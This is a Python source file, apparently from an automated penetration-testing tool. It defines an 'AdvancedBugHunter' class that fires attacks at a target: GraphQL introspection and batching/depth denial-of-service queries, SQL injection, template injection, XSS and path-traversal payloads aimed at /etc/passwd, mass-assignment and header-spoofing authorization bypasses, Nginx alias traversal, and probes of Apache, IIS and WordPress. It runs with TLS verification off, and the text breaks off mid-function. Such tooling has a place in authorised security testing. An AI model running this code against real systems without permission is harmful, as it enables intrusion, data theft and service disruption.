"""
Advanced Bug Hunter - Contextual Exploitation Engine

This module implements advanced bug hunting techniques that go beyond traditional
scanning. It thinks like a persistent attacker, exploring every possibility and
chaining information to discover complex vulnerabilities.

Features:
- Technology-specific exploitation (GraphQL, APIs, specific servers)
- Advanced fuzzing with polyglot payloads
- Business logic vulnerability testing
- Privilege escalation simulation
- Living off the land techniques
"""

import asyncio
import json
import re
import requests
import time
import random
import string
import base64
import hashlib
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from app.logger import logger
from app.reconnaissance.kali_tools import KaliToolsManager


class AdvancedBugHunter:
    """Advanced bug hunting engine with contextual exploitation capabilities"""
    
    def __init__(self, target: str, recon_data: Dict[str, Any] = None, llm_client=None):
        self.target = target
        self.recon_data = recon_data or {}
        self.llm_client = llm_client
        self.kali_tools = KaliToolsManager()
        
        # Session management
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        # Exploitation state
        self.discovered_vulns = []
        self.exploitation_chains = []
        self.user_contexts = {}  # Different user privilege levels
        self.attack_surface = {}
        
        # Payloads and techniques
        self.polyglot_payloads = self._load_polyglot_payloads()
        self.ssti_payloads = self._load_ssti_payloads()
        self.xxe_payloads = self._load_xxe_payloads()
        self.nosql_payloads = self._load_nosql_payloads()
        
        logger.info(f"Advanced Bug Hunter initialized for {target}")

    async def comprehensive_bug_hunt(self, 
                                   deep_exploitation: bool = True,
                                   business_logic_focus: bool = True,
                                   privilege_escalation: bool = True) -> Dict[str, Any]:
        """
        Perform comprehensive bug hunting with advanced techniques
        
        Args:
            deep_exploitation: Enable deep exploitation techniques
            business_logic_focus: Focus on business logic vulnerabilities
            privilege_escalation: Attempt privilege escalation scenarios
        """
        logger.info("Starting comprehensive advanced bug hunting")
        
        results = {
            'target': self.target,
            'contextual_exploitation': {},
            'advanced_fuzzing': {},
            'business_logic_testing': {},
            'privilege_escalation': {},
            'exploitation_chains': [],
            'high_impact_findings': [],
            'summary': {}
        }
        
        # Phase 1: Contextual Post-Reconnaissance Exploitation
        logger.info("Phase 1: Contextual post-reconnaissance exploitation")
        results['contextual_exploitation'] = await self._contextual_exploitation()
        
        # Phase 2: Advanced Fuzzing and Injection
        logger.info("Phase 2: Advanced fuzzing and injection techniques")
        results['advanced_fuzzing'] = await self._advanced_fuzzing_techniques()
        
        # Phase 3: Business Logic Vulnerability Testing
        if business_logic_focus:
            logger.info("Phase 3: Business logic vulnerability testing")
            results['business_logic_testing'] = await self._business_logic_testing()
        
        # Phase 4: Privilege Escalation and Persistence Simulation
        if privilege_escalation:
            logger.info("Phase 4: Privilege escalation simulation")
            results['privilege_escalation'] = await self._privilege_escalation_testing()
        
        # Phase 5: Exploitation Chain Analysis
        if deep_exploitation:
            logger.info("Phase 5: Exploitation chain analysis")
            results['exploitation_chains'] = await self._analyze_exploitation_chains()
        
        # Generate comprehensive summary
        results['summary'] = self._generate_bug_hunt_summary(results)
        results['high_impact_findings'] = self._identify_high_impact_findings()
        
        logger.info(f"Advanced bug hunting completed. Found {len(self.discovered_vulns)} potential vulnerabilities")
        return results

    async def _contextual_exploitation(self) -> Dict[str, Any]:
        """Perform technology-specific contextual exploitation"""
        logger.info("Starting contextual exploitation based on discovered technologies")
        
        exploitation_results = {
            'graphql_exploitation': {},
            'api_exploitation': {},
            'server_specific_tests': {},
            'subdomain_exploitation': {},
            'forgotten_endpoints': {}
        }
        
        # Extract technology information from reconnaissance data
        technologies = self.recon_data.get('technology_fingerprinting', {})
        apis = self.recon_data.get('api_discovery', {})
        subdomains = self.recon_data.get('asset_validation', {}).get('live_hosts', [])
        
        # GraphQL Exploitation
        graphql_endpoints = apis.get('graphql_endpoints', [])
        if graphql_endpoints:
            exploitation_results['graphql_exploitation'] = await self._exploit_graphql(graphql_endpoints)
        
        # REST API Exploitation
        rest_apis = apis.get('rest_apis', [])
        if rest_apis:
            exploitation_results['api_exploitation'] = await self._exploit_rest_apis(rest_apis)
        
        # Server-specific exploitation
        exploitation_results['server_specific_tests'] = await self._server_specific_exploitation(technologies)
        
        # Subdomain exploitation (test/staging environments)
        exploitation_results['subdomain_exploitation'] = await self._exploit_forgotten_subdomains(subdomains)
        
        return exploitation_results

    async def _exploit_graphql(self, graphql_endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Exploit GraphQL endpoints with advanced techniques"""
        logger.info(f"Exploiting {len(graphql_endpoints)} GraphQL endpoints")
        
        graphql_results = {
            'introspection_results': {},
            'batching_attacks': {},
            'depth_limit_bypass': {},
            'field_fuzzing': {},
            'authorization_bypass': {}
        }
        
        for endpoint_info in graphql_endpoints:
            endpoint_url = endpoint_info['url']
            logger.info(f"Testing GraphQL endpoint: {endpoint_url}")
            
            try:
                # 1. Introspection Query
                introspection_result = await self._graphql_introspection(endpoint_url)
                graphql_results['introspection_results'][endpoint_url] = introspection_result
                
                # 2. Batching Attacks (DoS via multiple queries)
                batching_result = await self._graphql_batching_attack(endpoint_url)
                graphql_results['batching_attacks'][endpoint_url] = batching_result
                
                # 3. Depth Limit Bypass
                depth_result = await self._graphql_depth_attack(endpoint_url)
                graphql_results['depth_limit_bypass'][endpoint_url] = depth_result
                
                # 4. Field Fuzzing based on introspection
                if introspection_result.get('schema'):
                    field_fuzz_result = await self._graphql_field_fuzzing(endpoint_url, introspection_result['schema'])
                    graphql_results['field_fuzzing'][endpoint_url] = field_fuzz_result
                
            except Exception as e:
                logger.error(f"GraphQL exploitation error for {endpoint_url}: {e}")
                graphql_results['introspection_results'][endpoint_url] = {'error': str(e)}
        
        return graphql_results

    async def _graphql_introspection(self, endpoint_url: str) -> Dict[str, Any]:
        """Perform GraphQL introspection to discover schema"""
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
                directives {
                    name
                    description
                    locations
                    args {
                        ...InputValue
                    }
                }
            }
        }
        
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    ...InputValue
                }
                type {
                    ...TypeRef
                }
                isDeprecated
                deprecationReason
            }
            inputFields {
                ...InputValue
            }
            interfaces {
                ...TypeRef
            }
            enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
            }
            possibleTypes {
                ...TypeRef
            }
        }
        
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }
        
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        
        try:
            response = self.session.post(
                endpoint_url,
                json={'query': introspection_query},
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    schema = data['data']['__schema']
                    
                    # Analyze schema for sensitive fields
                    sensitive_fields = self._analyze_graphql_schema(schema)
                    
                    return {
                        'introspection_enabled': True,
                        'schema': schema,
                        'sensitive_fields': sensitive_fields,
                        'vulnerability': 'GraphQL introspection enabled - information disclosure'
                    }
                else:
                    return {
                        'introspection_enabled': False,
                        'error': data.get('errors', 'Unknown error')
                    }
            else:
                return {
                    'introspection_enabled': False,
                    'status_code': response.status_code,
                    'response': response.text[:500]
                }
                
        except Exception as e:
            return {'error': str(e)}

    def _analyze_graphql_schema(self, schema: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze GraphQL schema for sensitive fields and operations"""
        sensitive_fields = []
        sensitive_keywords = [
            'password', 'token', 'secret', 'key', 'admin', 'user', 'email',
            'credit', 'payment', 'billing', 'private', 'internal', 'debug'
        ]
        
        types = schema.get('types', [])
        for type_def in types:
            if type_def.get('fields'):
                for field in type_def['fields']:
                    field_name = field.get('name', '').lower()
                    if any(keyword in field_name for keyword in sensitive_keywords):
                        sensitive_fields.append({
                            'type': type_def.get('name'),
                            'field': field.get('name'),
                            'description': field.get('description'),
                            'args': field.get('args', [])
                        })
        
        return sensitive_fields

    async def _graphql_batching_attack(self, endpoint_url: str) -> Dict[str, Any]:
        """Test GraphQL batching attacks for DoS"""
        # Create a batch of expensive queries
        expensive_query = """
        query ExpensiveQuery {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
        """
        
        # Create batch of 100 queries
        batch_queries = [{'query': expensive_query} for _ in range(100)]
        
        try:
            start_time = time.time()
            response = self.session.post(
                endpoint_url,
                json=batch_queries,
                headers={'Content-Type': 'application/json'},
                timeout=30
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            
            if response.status_code == 200 and response_time > 10:
                return {
                    'vulnerable': True,
                    'response_time': response_time,
                    'vulnerability': 'GraphQL batching attack successful - potential DoS',
                    'batch_size': 100
                }
            else:
                return {
                    'vulnerable': False,
                    'response_time': response_time,
                    'status_code': response.status_code
                }
                
        except requests.Timeout:
            return {
                'vulnerable': True,
                'vulnerability': 'GraphQL batching caused timeout - DoS confirmed',
                'timeout': True
            }
        except Exception as e:
            return {'error': str(e)}

    async def _graphql_depth_attack(self, endpoint_url: str) -> Dict[str, Any]:
        """Test GraphQL depth limit bypass"""
        # Create deeply nested query
        deep_query = """
        query DeepQuery {
            __schema {
                types {
                    fields {
                        type {
                            fields {
                                type {
                                    fields {
                                        type {
                                            fields {
                                                type {
                                                    fields {
                                                        type {
                                                            name
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        
        try:
            start_time = time.time()
            response = self.session.post(
                endpoint_url,
                json={'query': deep_query},
                headers={'Content-Type': 'application/json'}
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            
            if response.status_code == 200 and response_time > 5:
                return {
                    'vulnerable': True,
                    'response_time': response_time,
                    'vulnerability': 'GraphQL depth limit bypass - resource exhaustion'
                }
            else:
                return {
                    'vulnerable': False,
                    'response_time': response_time,
                    'status_code': response.status_code
                }
                
        except Exception as e:
            return {'error': str(e)}

    async def _graphql_field_fuzzing(self, endpoint_url: str, schema: Dict[str, Any]) -> Dict[str, Any]:
        """Fuzz GraphQL fields based on discovered schema"""
        fuzzing_results = {
            'field_tests': [],
            'vulnerabilities_found': []
        }
        
        # Extract queryable fields from schema
        query_type = None
        for type_def in schema.get('types', []):
            if type_def.get('name') == schema.get('queryType', {}).get('name'):
                query_type = type_def
                break
        
        if not query_type or not query_type.get('fields'):
            return {'error': 'No queryable fields found'}
        
        # Test each field with various payloads
        for field in query_type['fields'][:10]:  # Limit to first 10 fields
            field_name = field.get('name')
            if not field_name:
                continue
            
            # Test field with different argument combinations
            args = field.get('args', [])
            if args:
                for arg in args[:3]:  # Test first 3 arguments
                    arg_name = arg.get('name')
                    if arg_name:
                        # Test with injection payloads
                        test_payloads = [
                            "' OR '1'='1",
                            "{{7*7}}",
                            "<script>alert(1)</script>",
                            "../../../etc/passwd"
                        ]
                        
                        for payload in test_payloads:
                            query = f"""
                            query TestQuery {{
                                {field_name}({arg_name}: "{payload}") {{
                                    ... on __Type {{
                                        name
                                    }}
                                }}
                            }}
                            """
                            
                            try:
                                response = self.session.post(
                                    endpoint_url,
                                    json={'query': query},
                                    headers={'Content-Type': 'application/json'}
                                )
                                
                                test_result = {
                                    'field': field_name,
                                    'argument': arg_name,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'response_length': len(response.text)
                                }
                                
                                # Check for potential vulnerabilities
                                if payload in response.text:
                                    test_result['vulnerability'] = 'Potential injection - payload reflected'
                                    fuzzing_results['vulnerabilities_found'].append(test_result)
                                
                                fuzzing_results['field_tests'].append(test_result)
                                
                            except Exception as e:
                                logger.debug(f"GraphQL field fuzzing error: {e}")
        
        return fuzzing_results

    async def _exploit_rest_apis(self, rest_apis: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Exploit REST APIs with advanced techniques"""
        logger.info(f"Exploiting {len(rest_apis)} REST API endpoints")
        
        api_results = {
            'swagger_analysis': {},
            'mass_assignment_tests': {},
            'authorization_bypass': {},
            'rate_limiting_tests': {},
            'parameter_pollution': {}
        }
        
        for api_info in rest_apis:
            api_url = api_info['url']
            logger.info(f"Testing REST API: {api_url}")
            
            try:
                # 1. Swagger/OpenAPI Documentation Analysis
                swagger_result = await self._analyze_swagger_docs(api_url)
                api_results['swagger_analysis'][api_url] = swagger_result
                
                # 2. Mass Assignment Testing
                mass_assignment_result = await self._test_mass_assignment(api_url, swagger_result)
                api_results['mass_assignment_tests'][api_url] = mass_assignment_result
                
                # 3. Authorization Bypass Testing
                auth_bypass_result = await self._test_authorization_bypass(api_url)
                api_results['authorization_bypass'][api_url] = auth_bypass_result
                
                # 4. Rate Limiting Tests
                rate_limit_result = await self._test_rate_limiting(api_url)
                api_results['rate_limiting_tests'][api_url] = rate_limit_result
                
                # 5. Parameter Pollution
                param_pollution_result = await self._test_parameter_pollution(api_url)
                api_results['parameter_pollution'][api_url] = param_pollution_result
                
            except Exception as e:
                logger.error(f"REST API exploitation error for {api_url}: {e}")
                api_results['swagger_analysis'][api_url] = {'error': str(e)}
        
        return api_results

    async def _analyze_swagger_docs(self, api_url: str) -> Dict[str, Any]:
        """Analyze Swagger/OpenAPI documentation"""
        swagger_paths = [
            '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api/swagger.json', '/v1/swagger.json', '/v2/swagger.json',
            '/swagger-ui.html', '/docs', '/redoc'
        ]
        
        base_url = '/'.join(api_url.split('/')[:3])  # Get base URL
        
        for swagger_path in swagger_paths:
            try:
                swagger_url = urljoin(base_url, swagger_path)
                response = self.session.get(swagger_url)
                
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')
                    
                    if 'json' in content_type:
                        try:
                            swagger_data = response.json()
                            return self._parse_swagger_data(swagger_data, swagger_url)
                        except json.JSONDecodeError:
                            continue
                    elif 'yaml' in content_type or swagger_path.endswith('.yaml'):
                        # For YAML, we'd need PyYAML, but let's try to parse as text
                        return {
                            'documentation_found': True,
                            'url': swagger_url,
                            'format': 'yaml',
                            'content_preview': response.text[:1000]
                        }
                    elif 'html' in content_type:
                        # Swagger UI found
                        return {
                            'documentation_found': True,
                            'url': swagger_url,
                            'format': 'html',
                            'swagger_ui': True
                        }
                        
            except Exception as e:
                logger.debug(f"Swagger analysis error for {swagger_url}: {e}")
        
        return {'documentation_found': False}

    def _parse_swagger_data(self, swagger_data: Dict[str, Any], swagger_url: str) -> Dict[str, Any]:
        """Parse Swagger/OpenAPI data to extract endpoints and parameters"""
        result = {
            'documentation_found': True,
            'url': swagger_url,
            'format': 'json',
            'endpoints': [],
            'sensitive_endpoints': [],
            'parameters': {}
        }
        
        # Extract API info
        if 'info' in swagger_data:
            result['api_info'] = swagger_data['info']
        
        # Extract paths/endpoints
        paths = swagger_data.get('paths', {})
        sensitive_keywords = ['admin', 'user', 'password', 'token', 'key', 'secret', 'payment', 'billing']
        
        for path, methods in paths.items():
            for method, details in methods.items():
                if isinstance(details, dict):
                    endpoint_info = {
                        'path': path,
                        'method': method.upper(),
                        'summary': details.get('summary', ''),
                        'parameters': details.get('parameters', [])
                    }
                    
                    result['endpoints'].append(endpoint_info)
                    
                    # Check for sensitive endpoints
                    if any(keyword in path.lower() or keyword in details.get('summary', '').lower() 
                           for keyword in sensitive_keywords):
                        result['sensitive_endpoints'].append(endpoint_info)
                    
                    # Extract parameters
                    for param in details.get('parameters', []):
                        param_name = param.get('name')
                        if param_name:
                            if path not in result['parameters']:
                                result['parameters'][path] = []
                            result['parameters'][path].append(param)
        
        return result

    async def _test_mass_assignment(self, api_url: str, swagger_data: Dict[str, Any]) -> Dict[str, Any]:
        """Test for mass assignment vulnerabilities"""
        mass_assignment_results = {
            'tests_performed': [],
            'vulnerabilities_found': []
        }
        
        if not swagger_data.get('endpoints'):
            return mass_assignment_results
        
        # Focus on POST/PUT endpoints that might accept user data
        target_endpoints = [
            ep for ep in swagger_data['endpoints'] 
            if ep['method'] in ['POST', 'PUT', 'PATCH']
        ]
        
        for endpoint in target_endpoints[:5]:  # Limit to first 5 endpoints
            path = endpoint['path']
            method = endpoint['method']
            
            # Common mass assignment payloads
            mass_assignment_payloads = [
                {'isAdmin': True, 'role': 'admin', 'admin': True},
                {'userId': 1, 'user_id': 1, 'id': 1},
                {'price': 0, 'cost': 0, 'amount': 0},
                {'verified': True, 'active': True, 'enabled': True}
            ]
            
            base_url = '/'.join(api_url.split('/')[:3])
            full_url = urljoin(base_url, path.lstrip('/'))
            
            for payload in mass_assignment_payloads:
                try:
                    if method == 'POST':
                        response = self.session.post(full_url, json=payload)
                    elif method == 'PUT':
                        response = self.session.put(full_url, json=payload)
                    elif method == 'PATCH':
                        response = self.session.patch(full_url, json=payload)
                    
                    test_result = {
                        'endpoint': full_url,
                        'method': method,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    }
                    
                    # Check for successful mass assignment
                    if response.status_code in [200, 201, 202]:
                        # Look for signs that the payload was accepted
                        response_text = response.text.lower()
                        if any(str(value).lower() in response_text for value in payload.values()):
                            test_result['vulnerability'] = 'Potential mass assignment vulnerability'
                            mass_assignment_results['vulnerabilities_found'].append(test_result)
                    
                    mass_assignment_results['tests_performed'].append(test_result)
                    
                except Exception as e:
                    logger.debug(f"Mass assignment test error: {e}")
        
        return mass_assignment_results

    async def _test_authorization_bypass(self, api_url: str) -> Dict[str, Any]:
        """Test for authorization bypass vulnerabilities"""
        auth_bypass_results = {
            'tests_performed': [],
            'vulnerabilities_found': []
        }
        
        # Common admin/sensitive endpoints to test
        sensitive_paths = [
            '/admin', '/admin/', '/admin/users', '/admin/config',
            '/api/admin', '/api/users', '/api/user', '/api/config',
            '/management', '/dashboard', '/panel'
        ]
        
        base_url = '/'.join(api_url.split('/')[:3])
        
        for path in sensitive_paths:
            full_url = urljoin(base_url, path.lstrip('/'))
            
            # Test different authorization bypass techniques
            bypass_techniques = [
                {'headers': {}, 'description': 'No authorization'},
                {'headers': {'Authorization': 'Bearer invalid_token'}, 'description': 'Invalid token'},
                {'headers': {'Authorization': 'Bearer '}, 'description': 'Empty token'},
                {'headers': {'X-User-ID': '1', 'X-Role': 'admin'}, 'description': 'Header injection'},
                {'headers': {'X-Forwarded-For': '127.0.0.1'}, 'description': 'IP bypass'},
                {'params': {'admin': '1', 'role': 'admin'}, 'description': 'Parameter injection'}
            ]
            
            for technique in bypass_techniques:
                try:
                    headers = technique.get('headers', {})
                    params = technique.get('params', {})
                    
                    response = self.session.get(full_url, headers=headers, params=params)
                    
                    test_result = {
                        'url': full_url,
                        'technique': technique['description'],
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    }
                    
                    # Check for successful bypass
                    if response.status_code == 200:
                        # Look for admin-like content
                        admin_indicators = ['admin', 'dashboard', 'users', 'config', 'management']
                        response_text = response.text.lower()
                        
                        if any(indicator in response_text for indicator in admin_indicators):
                            test_result['vulnerability'] = 'Potential authorization bypass'
                            auth_bypass_results['vulnerabilities_found'].append(test_result)
                    
                    auth_bypass_results['tests_performed'].append(test_result)
                    
                except Exception as e:
                    logger.debug(f"Authorization bypass test error: {e}")
        
        return auth_bypass_results

    async def _test_rate_limiting(self, api_url: str) -> Dict[str, Any]:
        """Test rate limiting on sensitive endpoints"""
        rate_limit_results = {
            'endpoints_tested': [],
            'vulnerabilities_found': []
        }
        
        # Endpoints that should have rate limiting
        sensitive_endpoints = [
            '/login', '/api/login', '/auth/login',
            '/register', '/api/register', '/auth/register',
            '/password/reset', '/api/password/reset',
            '/api/users', '/api/user'
        ]
        
        base_url = '/'.join(api_url.split('/')[:3])
        
        for endpoint in sensitive_endpoints:
            full_url = urljoin(base_url, endpoint.lstrip('/'))
            
            try:
                # Send multiple requests rapidly
                responses = []
                start_time = time.time()
                
                for i in range(20):  # Send 20 requests
                    response = self.session.post(
                        full_url,
                        json={'username': f'test{i}', 'password': 'test123'},
                        timeout=5
                    )
                    responses.append(response.status_code)
                    
                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.1)
                
                end_time = time.time()
                total_time = end_time - start_time
                
                # Analyze responses
                successful_requests = sum(1 for status in responses if status not in [429, 503])
                
                test_result = {
                    'endpoint': full_url,
                    'total_requests': 20,
                    'successful_requests': successful_requests,
                    'total_time': total_time,
                    'responses': responses
                }
                
                # Check if rate limiting is missing or insufficient
                if successful_requests > 15:  # More than 75% success rate
                    test_result['vulnerability'] = 'Insufficient or missing rate limiting'
                    rate_limit_results['vulnerabilities_found'].append(test_result)
                
                rate_limit_results['endpoints_tested'].append(test_result)
                
            except Exception as e:
                logger.debug(f"Rate limiting test error for {full_url}: {e}")
        
        return rate_limit_results

    async def _test_parameter_pollution(self, api_url: str) -> Dict[str, Any]:
        """Test for HTTP parameter pollution vulnerabilities"""
        pollution_results = {
            'tests_performed': [],
            'vulnerabilities_found': []
        }
        
        # Common parameters to test for pollution
        test_parameters = ['user_id', 'id', 'role', 'admin', 'price', 'amount']
        
        base_url = '/'.join(api_url.split('/')[:3])
        test_endpoints = [api_url, urljoin(base_url, '/api/user'), urljoin(base_url, '/api/users')]
        
        for endpoint in test_endpoints:
            for param in test_parameters:
                try:
                    # Test parameter pollution with different values
                    pollution_url = f"{endpoint}?{param}=user&{param}=admin"
                    
                    response = self.session.get(pollution_url)
                    
                    test_result = {
                        'endpoint': endpoint,
                        'parameter': param,
                        'pollution_url': pollution_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    }
                    
                    # Check for signs of parameter pollution
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        if 'admin' in response_text and 'user' in response_text:
                            test_result['vulnerability'] = 'Potential parameter pollution vulnerability'
                            pollution_results['vulnerabilities_found'].append(test_result)
                    
                    pollution_results['tests_performed'].append(test_result)
                    
                except Exception as e:
                    logger.debug(f"Parameter pollution test error: {e}")
        
        return pollution_results

    async def _server_specific_exploitation(self, technologies: Dict[str, Any]) -> Dict[str, Any]:
        """Perform server-specific exploitation based on detected technologies"""
        logger.info("Starting server-specific exploitation")
        
        server_results = {
            'nginx_tests': {},
            'apache_tests': {},
            'iis_tests': {},
            'technology_specific_tests': {}
        }
        
        # Extract server information
        web_technologies = technologies.get('web_technologies', {})
        
        for url, tech_info in web_technologies.items():
            server_info = tech_info.get('server_info', {})
            server = server_info.get('server', '').lower()
            
            if 'nginx' in server:
                server_results['nginx_tests'][url] = await self._test_nginx_vulnerabilities(url)
            elif 'apache' in server:
                server_results['apache_tests'][url] = await self._test_apache_vulnerabilities(url)
            elif 'iis' in server or 'microsoft' in server:
                server_results['iis_tests'][url] = await self._test_iis_vulnerabilities(url)
            
            # Test for specific technologies
            tech_tests = await self._test_technology_specific_vulns(url, tech_info)
            server_results['technology_specific_tests'][url] = tech_tests
        
        return server_results

    async def _test_nginx_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Nginx-specific vulnerabilities"""
        nginx_results = {
            'alias_traversal': {},
            'merge_slashes': {},
            'variable_leakage': {}
        }
        
        # Test Nginx alias traversal
        alias_paths = [
            '/assets../etc/passwd',
            '/static../etc/passwd',
            '/files../etc/passwd',
            '/images../etc/passwd'
        ]
        
        for path in alias_paths:
            try:
                test_url = urljoin(url, path)
                response = self.session.get(test_url)
                
                if response.status_code == 200 and 'root:' in response.text:
                    nginx_results['alias_traversal'][path] = {
                        'vulnerable': True,
                        'vulnerability': 'Nginx alias traversal - /etc/passwd accessible'
                    }
                else:
                    nginx_results['alias_traversal'][path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                nginx_results['alias_traversal'][path] = {'error': str(e)}
        
        # Test merge_slashes off vulnerability
        merge_slash_paths = [
            '/api//admin',
            '/admin//config',
            '//admin',
            '/api///users'
        ]
        
        for path in merge_slash_paths:
            try:
                test_url = urljoin(url, path)
                response = self.session.get(test_url)
                
                if response.status_code in [200, 301, 302]:
                    nginx_results['merge_slashes'][path] = {
                        'potentially_vulnerable': True,
                        'status_code': response.status_code,
                        'vulnerability': 'Potential merge_slashes bypass'
                    }
                else:
                    nginx_results['merge_slashes'][path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                nginx_results['merge_slashes'][path] = {'error': str(e)}
        
        return nginx_results

    async def _test_apache_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Apache-specific vulnerabilities"""
        apache_results = {
            'htaccess_bypass': {},
            'server_status': {},
            'mod_rewrite_bypass': {}
        }
        
        # Test .htaccess bypass techniques
        htaccess_bypasses = [
            '/.htaccess',
            '/.htaccess.bak',
            '/.htaccess~',
            '/.htaccess.txt',
            '/admin/.htaccess'
        ]
        
        for bypass_path in htaccess_bypasses:
            try:
                test_url = urljoin(url, bypass_path)
                response = self.session.get(test_url)
                
                if response.status_code == 200 and ('deny' in response.text.lower() or 'allow' in response.text.lower()):
                    apache_results['htaccess_bypass'][bypass_path] = {
                        'vulnerable': True,
                        'vulnerability': '.htaccess file accessible'
                    }
                else:
                    apache_results['htaccess_bypass'][bypass_path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                apache_results['htaccess_bypass'][bypass_path] = {'error': str(e)}
        
        # Test server-status and server-info
        status_paths = ['/server-status', '/server-info', '/status', '/info']
        
        for status_path in status_paths:
            try:
                test_url = urljoin(url, status_path)
                response = self.session.get(test_url)
                
                if response.status_code == 200 and ('apache' in response.text.lower() or 'server version' in response.text.lower()):
                    apache_results['server_status'][status_path] = {
                        'vulnerable': True,
                        'vulnerability': 'Apache server status/info accessible'
                    }
                else:
                    apache_results['server_status'][status_path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                apache_results['server_status'][status_path] = {'error': str(e)}
        
        return apache_results

    async def _test_iis_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for IIS-specific vulnerabilities"""
        iis_results = {
            'short_filename_disclosure': {},
            'aspnet_trace': {},
            'debug_mode': {}
        }
        
        # Test IIS short filename disclosure
        short_name_paths = [
            '/admin~1/',
            '/backup~1/',
            '/config~1/',
            '/test~1/'
        ]
        
        for path in short_name_paths:
            try:
                test_url = urljoin(url, path)
                response = self.session.get(test_url)
                
                if response.status_code in [200, 301, 302]:
                    iis_results['short_filename_disclosure'][path] = {
                        'potentially_vulnerable': True,
                        'status_code': response.status_code,
                        'vulnerability': 'Potential IIS short filename disclosure'
                    }
                else:
                    iis_results['short_filename_disclosure'][path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                iis_results['short_filename_disclosure'][path] = {'error': str(e)}
        
        # Test ASP.NET trace
        trace_paths = ['/trace.axd', '/Trace.axd']
        
        for trace_path in trace_paths:
            try:
                test_url = urljoin(url, trace_path)
                response = self.session.get(test_url)
                
                if response.status_code == 200 and 'trace' in response.text.lower():
                    iis_results['aspnet_trace'][trace_path] = {
                        'vulnerable': True,
                        'vulnerability': 'ASP.NET trace enabled'
                    }
                else:
                    iis_results['aspnet_trace'][trace_path] = {
                        'vulnerable': False,
                        'status_code': response.status_code
                    }
            except Exception as e:
                iis_results['aspnet_trace'][trace_path] = {'error': str(e)}
        
        return iis_results

    async def _test_technology_specific_vulns(self, url: str, tech_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test for vulnerabilities specific to detected technologies"""
        tech_results = {
            'cms_vulnerabilities': {},
            'framework_vulnerabilities': {},
            'javascript_vulnerabilities': {}
        }
        
        # CMS-specific tests
        cms = tech_info.get('cms')
        if cms:
            tech_results['cms_vulnerabilities'] = await self._test_cms_vulnerabilities(url, cms)
        
        # Framework-specific tests
        frameworks = tech_info.get('frameworks', [])
        for framework in frameworks:
            framework_tests = await self._test_framework_vulnerabilities(url, framework)
            tech_results['framework_vulnerabilities'][framework] = framework_tests
        
        # JavaScript library tests
        js_libs = tech_info.get('javascript_libs', [])
        for lib_info in js_libs:
            lib_name = lib_info.get('library')
            lib_version = lib_info.get('version')
            if lib_name and lib_version:
                js_tests = await self._test_js_library_vulnerabilities(url, lib_name, lib_version)
                tech_results['javascript_vulnerabilities'][f"{lib_name}_{lib_version}"] = js_tests
        
        return tech_results

    async def _test_cms_vulnerabilities(self, url: str, cms: str) -> Dict[str, Any]:
        """Test for CMS-specific vulnerabilities"""
        cms_results = {}
        
        if cms.lower() == 'wordpress':
            cms_results = await self._test_wordpress_vulnerabilities(url)
        elif cms.lower() == 'drupal':
            cms_results = await self._test_drupal_vulnerabilities(url)
        elif cms.lower() == 'joomla':
            cms_results = await self._test_joomla_vulnerabilities(url)
        
        return cms_results

    async def _test_wordpress_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for WordPress-specific vulnerabilities"""
        wp_results = {
            'user_enumeration': {},
            'xmlrpc_enabled': {},
            'debug_log': {},
            'config_backup': {}
        }
        
        # Test user enumeration
        try:
            enum_url = urljoin(url, '/wp-json/wp/v2/users')
            response = self.session.get(enum_url)
            
            if response.status_code == 200:
                try:
                    users = response.json()
                    if isinstance(users, list) and len(users) > 0:
                        wp_results['user_enumeration'] = {
                            'vulnerable': True,
                            'vulnerability': 'WordPress user enumeration via REST API',
                            'users_found': len(users)
                        }
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            wp_results['user_enumeration'] = {'error': str(e)}
        
        # Test XML-RPC
        try:
            xmlrpc_url = urljoin(url, '/xmlrpc.php')
            response = self.session.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>')
            
            if response.status_code == 200 and 'methodResponse' in response.text:
